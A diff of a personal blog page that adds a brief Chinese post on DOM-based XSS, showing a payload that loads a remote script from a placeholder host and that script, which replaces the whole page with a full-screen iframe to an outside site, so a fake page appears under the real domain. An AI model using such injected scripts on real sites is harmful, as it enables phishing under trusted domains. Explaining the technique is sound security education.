@@ -9,8 +9,8 @@
   <meta name="author" content="jason">
 
   
-  <meta name="description" content="
-">
+  <meta name="description" content="因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面 page解码后为 1
+&lt;script src=&quot;http://xxxx.com/yy.js&quot;&gt;&lt;/script&gt; yy.js的内容 1 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -93,15 +93,41 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 <time class='entry-date' datetime='2016-08-03T11:04:09+08:00'><span class='date'>2016 年8 月3 日</span> <span class='time'>11:04 am</span></time>
         
-           | <a href="#disqus_thread"
-             data-disqus-identifier="http://jason5.cn">Comments</a>
-        
       </p>
     
   </header>
 
 
-<div class="entry-content">
+<div class="entry-content"><p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
+
+<p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>
+
+<p>page解码后为</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://xxxx.com/yy.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>yy.js的内容</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="p">(){</span>
+</span><span class='line'>  <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="o">=</span><span class="s2">&quot;XSS test&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">bgColor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">fgColor</span><span class="o">=</span><span class="s2">&quot;white&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;&lt;iframe src=&#39;http://www.qqdx.albbz.cn/&#39; width=&#39;100%&#39; height=&#39;100%&#39;&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>原始页面内容
+<img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
 </div>
 
 
@@ -119,6 +145,12 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 <time class='entry-date' datetime='2016-08-03T11:04:09+08:00'><span class='date'>2016 年8 月3 日</span> <span class='time'>11:04 am</span></time>
       
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/security/'>security</a>
+  
+</span>
 
 
     </p>
@@ -139,12 +171,6 @@ $(document).bind('DOMNodeInserted', function(event) {
   </footer>
 </article>
 
-  <section>
-    <h1>Comments</h1>
-    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</div>
-  </section>
-
 </div>
 
 <aside class="sidebar">
@@ -154,7 +180,7 @@ $(document).bind('DOMNodeInserted', function(event) {
   <ul id="categories">
     <li class='category'><a href='/blog/categories/android/'>android (2)</a></li>
 <li class='category'><a href='/blog/categories/other/'>other (3)</a></li>
-<li class='category'><a href='/blog/categories/security/'>security (1)</a></li>
+<li class='category'><a href='/blog/categories/security/'>security (2)</a></li>
 <li class='category'><a href='/blog/categories/web/'>web (1)</a></li>
 
   </ul>
@@ -203,22 +229,6 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 </footer>
   
-
-<script type="text/javascript">
-      var disqus_shortname = 'jason5';
-      
-        
-        // var disqus_developer = 1;
-        var disqus_identifier = 'http://jason5.cn/blog/dom-xss.html';
-        var disqus_url = 'http://jason5.cn/blog/dom-xss.html';
-        var disqus_script = 'embed.js';
-      
-    (function () {
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
